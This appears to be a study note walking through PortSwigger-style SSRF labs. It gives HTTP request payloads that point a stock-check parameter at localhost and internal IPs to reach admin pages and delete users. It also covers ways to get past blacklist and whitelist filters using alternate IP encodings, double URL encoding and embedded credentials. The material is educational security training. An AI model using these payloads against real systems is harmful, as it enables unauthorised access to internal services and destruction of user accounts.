Server side request forgery is a web application vulnerability that allows the server side aplication to make  HTTP requests to an arbitrary domain of the attacker's choosing.

#### SSRF attacks against the server itself

In an SSRF attack against the server itself, the attacker induces the application to make an HTTP request back to the server that is hosting the application, via its loopback network interface.
This will typically involve supplying a URL with a hostname like 127.0.0.1 (a reserved IP address that points to the loopback adapter) or localhost.
for example:
````
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
````
The above shopping application checks its stock status by requesting various back-end REST APIs so the request goes into the "stockApi" variable through frontend HTTP requests and 
by modiifng the "stockApi" variable into "http://localhost/admin"
````
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin
````
Now if u can delete a user by "http://localhost/admin/delete?username=user1"

#### SSRF attacks against other back-end systems
Another type of trust relationship that often arises with server-side request forgery is where the application server is able to interact with other back-end systems that are not directly reachable by users. These systems often have non-routable private IP addresses. Since the back-end systems are normally protected by the network topology, they often have a weaker security posture.
````
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://IP/admin
**To find the correct IP octate try passing it to intruder and then add the payload to the required octate(192.168.0.1 here .1) change the payload type to Numbers 1-255.**
````
#### SSRF with blacklist-based input filters
Some applications block input containing hostnames like 127.0.0.1 and localhost, or sensitive URLs like /admin. In this situation, you can often circumvent the filter using various techniques:

Using an alternative IP representation of 127.0.0.1, such as 2130706433, 017700000001, or 127.1.
Registering your own domain name that resolves to 127.0.0.1. You can use spoofed.burpcollaborator.net for this purpose.
Obfuscating blocked strings using URL encoding or case variation.
example:-
Example from the line13 try changing the stockapi to http://127.1/admin and if that didnt work try using the Double-URL encoding for a in admin. 

#### SSRF with whitelist-based input filters
````
1.Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
2.Change the URL in the stockApi parameter to http://127.0.0.1/ and observe that the application is parsing the URL, 
extracting the hostname, and validating it against a whitelist.
3.Change the URL to http://username@stock.weliketoshop.net/ and observe that this is accepted, 
indicating that the URL parser supports embedded credentials.
4.Append a # to the username and observe that the URL is now rejected.
5.Double-URL encode the # to %2523 and observe the extremely suspicious "Internal Server Error" response, 
indicating that the server may have attempted to connect to "username".
6.Change the URL to http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos 
to access the admin interface and delete the target user.
````








